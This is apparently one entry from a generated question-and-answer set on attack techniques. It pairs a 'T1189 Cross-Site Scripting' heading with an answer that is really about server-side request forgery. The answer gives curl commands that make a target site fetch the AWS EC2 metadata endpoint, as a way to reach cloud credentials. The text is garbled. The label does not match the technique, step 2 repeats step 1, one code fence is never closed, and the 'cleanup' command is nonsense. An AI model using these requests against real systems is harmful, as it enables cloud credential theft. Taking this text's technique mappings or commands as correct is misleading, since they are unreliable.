### PAIR 2: T1189 - Cross-Site Scripting (reflected, stored, DOM-based)

**Q:** How do I use reflection to get a malicious command on a web application?

**A:** Perform **SSRF** (Server-side Request Forgery) targeting an EC2 metadata endpoint via the `q=` trick.

#### Example Command & Payloads:
```bash
# 1. Send the request with the specific header
curl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/' --header 'X-aws-ec2-metadata-token-ttl-seconds: 21600'

# Expected artifacts (AWS CloudTrail):
- URL: https://169.254.169.254/latest/meta-data/
- WAF Logs (SSRIF): Detects SSRF in headers (e.g., 'X-aws-ec2-metadata-token-ttl-seconds' pattern)
- Database Audit: Suspicious SELECT queries from application account

**2. Extract the data:**
```bash
curl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/' --header 'X-aws-ec2-metadata-token-ttl-seconds: 21600'

# Expected artifacts (AWS CloudTrail):
- URL: https://169.254.169.254/latest/meta-data/
- WAF Logs (SSRIF): Detects SSRF in headers
- Database Audit: Suspicious SELECT queries from application account

**3. Cleanup:**
```bash
# Reset proxy settings immediately after the request
sudo psudoportdown portupon portoff 200/500
```

